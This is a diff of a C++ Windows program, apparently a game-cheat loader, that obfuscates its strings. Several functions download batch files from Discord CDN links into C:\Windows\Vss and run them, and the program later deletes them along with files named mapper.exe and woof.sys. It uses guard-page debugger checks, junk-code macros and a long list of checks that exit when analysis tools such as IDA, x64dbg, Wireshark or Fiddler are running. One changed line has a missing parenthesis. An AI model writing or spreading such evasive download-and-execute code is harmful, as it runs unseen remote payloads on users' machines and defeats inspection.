@@ -235,7 +235,7 @@ bool MemoryBreakpointDebuggerCheck()
         return false;
 
     // Write a ret to the buffer (opcode 0xc3)
-    pMem = (unsigned char*)pAllocation;
+    pMem = (unsigned char*)pAllocation; 
     *pMem = 0xc3;
 
     // Make the page a guard page         
@@ -318,7 +318,7 @@ void apex()
     JUNK_CODE_ONE
         JUNK_CODE_ONE
         std::string apex = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114575800954941/apex.bat"));
-    std::string apexpath = "C:\\Windows\\Vss\\Apex.bat";
+    std::string apexpath = (dead("C:\\Windows\\Vss\\Apex.bat").c_str());
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
     system("cd C:\\Windows\\Vss\\");
     system("Start C:\\Windows\\Vss\\Apex.bat");
@@ -344,7 +344,7 @@ void gta()
 
 
     std::string gta = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
-    std::string gtapath = "C:\\Windows\\Vss\\gta.bat";
+    std::string gtapath = (dead("C:\\Windows\\Vss\\gta.bat").c_str());
     URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
     system("cd C:\\Windows\\Vss\\");
     system("Start C:\\Windows\\Vss\\gta.bat");
@@ -369,7 +369,7 @@ void fortnite()
 
 
     std::string fortnite = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114573007527946/Fortnite.bat"));
-    std::string fortnitepath = "C:\\Windows\\Vss\\Fortnite.bat";
+    std::string fortnitepath = (dead("C:\\Windows\\Vss\\Fortnite.bat").c_str());
     URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
     system("cd C:\\Windows\\Vss\\");
     system("Start C:\\Windows\\Vss\\Fortnite.bat");
@@ -392,7 +392,7 @@ void fishingplanet()
     tlmisir();
 
     std::string fishingplanet = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
-    std::string fishingplanetpath = "C:\\Windows\\Vss\\Fishing-planet.bat";
+    std::string fishingplanetpath = (dead("C:\\Windows\\Vss\\Fishing-planet.bat").c_str());
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
     system("cd C:\\Windows\Vss\\");
     system("Start C:\\Windows\\Vss\\Fishing-planet.bat");
@@ -416,7 +416,7 @@ void cod()
     tlmisir();
 
     std::string cod = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114570369318962/Cold-Ware.bat"));
-    std::string codpath = "C:\\Windows\\Vss\\Cold-Ware.bat";
+    std::string codpath = (dead("C:\\Windows\\Vss\\Cold-Ware.bat").c_str());
     URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
     system("cd C:\\Windows\\Vss\\");
     system("Start C:\\Windows\\Vss\\Cold-Ware.bat");
@@ -566,7 +566,7 @@ void deleter()
 
 
     //delete the files we downloaded
-    system("cd C:\\Windows\Vss\\");
+    system(dead("cd C:\\Windows\Vss\\").c_str());
     system(dead("del C:\\Windows\\Vss\\woof.sys").c_str());
     system(dead("del C:\\Windows\\Vss\\mapper.exe").c_str());
     system(dead("del C:\\Windows\\Vss\\Cold-Ware.bat").c_str());
@@ -607,21 +607,6 @@ void safeshutdown()
     system(dead("cls").c_str());
     std::cout << (dead("Do you want to restart your pc? \nYes/No : ").c_str());
     cin >> a;
-    if (GetAsyncKeyState(VK_END))
-    {
-        MessageBoxA(NULL, "congratualtions. you got the ( finder ) role on our discord.", "congratulations", MB_OKCANCEL);
-        safeshutdown();
-    }
-    if (GetAsyncKeyState(VK_DELETE))
-    {
-        MessageBoxA(NULL, "congratualtions. you got the ( exiter ) role on our discord.", "congratulations", MB_OKCANCEL);
-        safeshutdown();
-    }
-    if (GetAsyncKeyState(VK_INSERT))
-    {
-        MessageBoxA(NULL, "congratualtions. you got the ( inserter ) role on our discord.", "congratulations", MB_OKCANCEL);
-        safeshutdown();
-    }
     if (a == "Yes" || a == "yes")
     {
         system(dead("shutdown -r").c_str());
@@ -1285,7 +1270,7 @@ int main()
         rydekem();
     lnttirs();
     tlmisir();
-    if (IsProcessRunning(L"ida.exe"))
+    if (IsProcessRunning(dead(L"ida.exe").c_str()))
     {
         trampoline;
         rydekem();
@@ -1314,7 +1299,7 @@ int main()
         rydekem();
     lnttirs();
     tlmisir();
-    if (IsProcessRunning(L"ProcessHacker.exe"))
+    if (IsProcessRunning(dead(L"ProcessHacker.exe").c_str()))
     {
         trampoline;
         rydekem();
@@ -1332,7 +1317,8 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(L"Fiddler.exe"))
+
+    if (IsProcessRunning(dead(L"Fiddler.exe").c_str()))
     {
         trampoline;
         rydekem();
@@ -1350,25 +1336,7 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(L"Fiddler.exe"))
-    {
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Fiddler detected && ECHO Fiddler detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    if (IsProcessRunning (L"Wireshark.exe"))
+    if (IsProcessRunning(dead(L"Wireshark.exe").c_str()))
     {
         trampoline;
         rydekem();
@@ -1386,7 +1354,7 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(L"PETools.exe"))
+    if (IsProcessRunning(dead(L"PETools.exe").c_str()))
     {
         trampoline;
 
@@ -1404,7 +1372,7 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(L"procexp.exe"))
+    if (IsProcessRunning(dead(L"procexp.exe").c_str()))
     {
         trampoline;
         rydekem();
@@ -1422,7 +1390,7 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(L"ImmunityDebugger.exe"))
+    if (IsProcessRunning(dead(L"ImmunityDebugger.exe").c_str()))
     {
         trampoline;
         rydekem();
@@ -1440,7 +1408,7 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(L"ida64.exe"))
+    if (IsProcessRunning(dead(L"ida64.exe").c_str()))
     {
         trampoline;
         rydekem();
@@ -1458,7 +1426,7 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(L"windbg.exe"))
+    if (IsProcessRunning(dead(L"windbg.exe").c_str()))
     {
         trampoline;
         rydekem();
@@ -1476,7 +1444,7 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(L"httpdebugger.exe"))
+    if (IsProcessRunning(dead(L"httpdebugger.exe").c_str()))
     {
         trampoline;
         rydekem();
@@ -1494,7 +1462,7 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(L"x32dbg.exe"))
+    if (IsProcessRunning(dead(L"x32dbg.exe").c_str()))
     {
         trampoline;
         rydekem();
@@ -1512,7 +1480,7 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(L"x64dbg.exe"))
+    if (IsProcessRunning(dead(L"x64dbg.exe").c_str()))
     {
         trampoline;
         rydekem();
@@ -1530,7 +1498,7 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(L"idaq.exe"))
+    if (IsProcessRunning(dead(L"idaq.exe").c_str())
     {
         
         trampoline;
@@ -1549,7 +1517,7 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(L"idaq64.exe"))
+    if (IsProcessRunning(dead(L"idaq64.exe").c_str()))
     {
 
         trampoline;
@@ -1568,7 +1536,7 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(L"ollydbg.exe"))
+    if (IsProcessRunning(dead(L"ollydbg.exe").c_str()))
     {
 
         trampoline;
